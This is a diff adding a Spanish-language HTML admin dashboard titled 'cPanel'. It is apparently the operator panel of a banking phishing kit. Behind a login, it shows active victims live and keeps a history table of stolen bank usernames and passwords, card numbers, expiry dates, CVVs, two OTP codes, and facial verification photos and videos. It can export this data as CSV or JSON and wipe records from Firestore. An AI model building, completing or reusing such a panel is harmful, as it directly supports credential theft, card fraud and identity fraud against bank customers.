@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous" />
+  <title>cPanel</title>
+  <link rel="stylesheet" href="css/panel.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+</head>
+
+<body>
+  
+  <div id="login-screen" class="login-container">
+    <div class="card">
+      <div class="card-header">
+        <h3 class="mb-0">Panel</h3>
+      </div>
+      <div class="card-body">
+        <form id="login-form">
+          <div class="form-group">
+            <label for="username">Usuario</label>
+            <input type="text" class="form-control" id="username" placeholder="Ingrese su usuario" />
+          </div>
+          <div class="form-group">
+            <label for="password">Contraseña</label>
+            <div class="input-group">
+              <input type="password" class="form-control" id="password" placeholder="Ingrese su contraseña" />
+              <div class="input-group-append">
+                <button class="btn btn-outline-secondary" type="button" id="toggle-password">
+                  <i class="fa fa-eye" id="eye-icon"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+          <button type="submit" class="btn btn-primary btn-block">
+            Iniciar Sesión
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+  
+  <div id="admin-panel" class="d-none">
+    <nav class="navbar navbar-dark mb-4">
+      <span class="navbar-brand">cPanel</span>
+      <div>
+        <button id="logout-btn" class="btn btn-outline-light">
+          Cerrar Sesión
+        </button>
+      </div>
+    </nav>
+    <div class="container-fluid">
+      <div class="row mb-4">
+        <div class="col-md-6">
+          <div class="counter-card blue">
+            <div id="counter-container">
+              <h5>Usuarios Activos</h5>
+              <h3 id="active-users-count">0</h3>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="focused-user-banner" class="alert alert-primary d-none d-flex justify-content-between align-items-center">
+        <span id="focused-user-banner-text">Modo aislado</span>
+        <a id="focused-user-banner-link" href="panel.html" class="btn btn-sm btn-dark font-weight-bold ml-3">Volver al panel</a>
+      </div>
+      <div class="row">
+        <div class="col-md-12">
+          <div class="card mb-4">
+            <div class="card-body">
+              <div id="no-users-message" class="alert alert-info d-none">
+                No hay usuarios activos en este momento.
+              </div>
+              <div id="users-list" class="row">
+                
+              </div>
+            </div>
+          </div>
+          <div class="d-flex col-12">
+          </div>
+          
+          
+          
+          <div id="historial-card" class="card mt-4">
+            <div class="card-header d-flex justify-content-between align-items-center">
+              <h4 class="mb-0">📊 Historial de Datos</h4>
+              <button class="btn btn-outline-primary btn-sm" onclick="toggleHistorial()">
+                <i class="fas fa-chart-bar"></i> Ver/Ocultar
+              </button>
+            </div>
+
+            <div class="card-body" id="historial-section" style="display: none;">
+              <div class="row mb-3">
+                <div class="col-md-3">
+                  <label for="fechaInicio">Fecha Inicio:</label>
+                  <input type="date" class="form-control form-control-sm" id="fechaInicio">
+                </div>
+                <div class="col-md-3">
+                  <label for="fechaFin">Fecha Fin:</label>
+                  <input type="date" class="form-control form-control-sm" id="fechaFin">
+                </div>
+                <div class="col-md-3">
+                  <label for="filtroUsuario">Usuario:</label>
+                  <input type="text" class="form-control form-control-sm" id="filtroUsuario"
+                    placeholder="Buscar usuario...">
+                </div>
+                <div class="col-md-3">
+                  <label for="filtroColor">Color:</label>
+                  <select class="form-control form-control-sm" id="filtroColor">
+                    <option value="">Todos</option>
+                    <option value="#dc3545">Rojo</option>
+                    <option value="#007bff">Azul</option>
+                    <option value="#28a745">Verde</option>
+                    <option value="#ffc107">Amarillo</option>
+                    <option value="#6f42c1">Morado</option>
+                    <option value="#fd7e14">Naranja</option>
+                  </select>
+                </div>
+              </div>
+
+              <div class="row mb-3">
+                <div class="col-md-8">
+                  <button class="btn btn-primary btn-sm mr-2" onclick="cargarHistorial()">
+                    <i class="fas fa-sync"></i> Actualizar
+                  </button>
+                  <button class="btn btn-info btn-sm mr-2" onclick="aplicarFiltrosHistorial()">
+                    <i class="fas fa-filter"></i> Filtrar
+                  </button>
+                  <button class="btn btn-success btn-sm mr-2" onclick="exportarHistorialCSV()">
+                    <i class="fas fa-file-csv"></i> CSV
+                  </button>
+                  <button class="btn btn-success btn-sm mr-2" onclick="exportarHistorialJSON()">
+                    <i class="fas fa-file-code"></i> JSON
+                  </button>
+                  <button class="btn btn-secondary btn-sm" onclick="limpiarFiltrosHistorial()">
+                    <i class="fas fa-eraser"></i> Limpiar
+                  </button>
+                </div>
+                <div class="col-md-6 text-right">
+                  <button class="btn btn-warning btn-sm mr-2" onclick="eliminarRegistrosAntiguos()">
+                    <i class="fas fa-calendar-times"></i> Eliminar Antiguos (90d)
+                  </button>
+                  <button class="btn btn-danger btn-sm" onclick="confirmarEliminacionTotal()">
+                    <i class="fas fa-trash-alt"></i> Eliminar Todos
+                  </button>
+                </div>
+              </div>
+
+              <div class="row mb-3" id="estadisticas-historial">
+                <div class="col-md-3">
+                  <div class="card bg-primary text-white">
+                    <div class="card-body text-center">
+                      <h5 id="total-registros">0</h5>
+                      <small>Total Registros</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <div class="card bg-info text-white">
+                    <div class="card-body text-center">
+                      <h5 id="colores-unicos">0</h5>
+                      <small>Colores Únicos</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <div class="card bg-success text-white">
+                    <div class="card-body text-center">
+                      <h5 id="dias-actividad">0</h5>
+                      <small>Días con Actividad</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <div class="card bg-warning text-white">
+                    <div class="card-body text-center">
+                      <h5 id="ultimo-acceso">N/A</h5>
+                      <small>Último Acceso</small>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div id="loading-historial" class="text-center" style="display: none;">
+                <div class="spinner-border text-primary" role="status">
+                  <span class="sr-only">Cargando...</span>
+                </div>
+                <p class="mt-2">Cargando datos del historial...</p>
+              </div>
+
+              <div class="table-responsive">
+                <table class="table table-striped table-sm" id="tabla-historial" style="display: none;">
+                  <thead class="thead-dark">
+                    <tr>
+                      <th>Tipo Doc</th>
+                      <th>Usuario</th>
+                      <th>Clave</th>
+                      <th>TDC Nombre</th>
+                      <th>TDC Numero</th>
+                      <th>TDC Mes</th>
+                      <th>TDC Año</th>
+                      <th>CVV</th>
+                      <th>OTP</th>
+                      <th>OTP2</th>
+                      <th>Facial</th>
+                    </tr>
+                  </thead>
+                  <tbody id="tbody-historial">
+
+                  </tbody>
+                </table>
+              </div>
+
+              <div id="no-data-historial" class="alert alert-info text-center" style="display: none;">
+                <i class="fas fa-inbox"></i>
+                <h5>No hay datos disponibles</h5>
+                <p>No se encontraron registros con los filtros aplicados.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="modal fade" id="modalEliminacionTotal" tabindex="-1" role="dialog"
+    aria-labelledby="modalEliminacionTotalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+        <div class="modal-header bg-danger text-white">
+          <h5 class="modal-title" id="modalEliminacionTotalLabel">
+            <i class="fas fa-exclamation-triangle"></i> ⚠️ Confirmación de Eliminación Total
+          </h5>
+          <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body">
+          <div class="alert alert-danger">
+            <h6><strong>¡ATENCIÓN! Esta acción es IRREVERSIBLE</strong></h6>
+            <p class="mb-2">Estás a punto de eliminar <strong>TODOS</strong> los registros del historial de datos.</p>
+            <ul class="mb-0">
+              <li>Se eliminarán <strong id="total-registros-modal">0</strong> registros</li>
+              <li>Esta acción <strong>NO se puede deshacer</strong></li>
+              <li>Se liberará espacio en Firestore</li>
+              <li>Se perderá todo el historial de usuarios</li>
+            </ul>
+          </div>
+          <div class="form-group">
+            <label for="confirmacionTexto">Para confirmar, escribe <strong>"ELIMINAR TODO"</strong>:</label>
+            <input type="text" class="form-control" id="confirmacionTexto" placeholder="Escribe: ELIMINAR TODO">
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="checkbox" id="confirmacionCheckbox">
+            <label class="form-check-label" for="confirmacionCheckbox">
+              Entiendo que esta acción es irreversible y eliminará todos los datos
+            </label>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">
+            <i class="fas fa-times"></i> Cancelar
+          </button>
+          <button type="button" class="btn btn-danger" id="btnConfirmarEliminacion" disabled
+            onclick="eliminarTodosLosRegistros()">
+            <i class="fas fa-trash-alt"></i> Eliminar Todos los Registros
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="modal fade" id="facialVideoModal" tabindex="-1" role="dialog" aria-labelledby="facialVideoModalLabel"
+    aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+      <div class="modal-content" style="background:#000;">
+        <div class="modal-header border-0">
+          <h5 class="modal-title text-white" id="facialVideoModalLabel">Video Facial</h5>
+          <button type="button" class="close text-white" data-dismiss="modal" aria-label="Cerrar">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body text-center p-0">
+          <video id="facialVideoPlayer" controls autoplay style="width:100%;max-height:70vh;"></video>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="modal fade" id="facialPhotoModal" tabindex="-1" role="dialog" aria-labelledby="facialPhotoModalLabel"
+    aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+      <div class="modal-content" style="background:#000;">
+        <div class="modal-header border-0">
+          <h5 class="modal-title text-white" id="facialPhotoModalLabel">Foto Facial</h5>
+          <button type="button" class="close text-white" data-dismiss="modal" aria-label="Cerrar">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body text-center p-0">
+          <img id="facialPhotoViewer" alt="" style="width:100%;max-height:70vh;object-fit:contain;">
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="modal fade" id="modalProgreso" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static"
+    data-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title">
+            <i class="fas fa-cog fa-spin"></i> Eliminando Registros...
+          </h5>
+        </div>
+        <div class="modal-body text-center">
+          <div class="progress mb-3">
+            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%"
+              id="barraProgreso"></div>
+          </div>
+          <p id="textoProgreso">Preparando eliminación...</p>
+          <small class="text-muted" id="detalleProgreso">Esto puede tomar varios minutos</small>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  
+  <script src="js/firebase-config.js"></script>
+  
+  <script type="module" src="js/panel.js"></script>
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+  
+  <script src="js/panelToggle.js"></script>
+</body>
+
+</html>
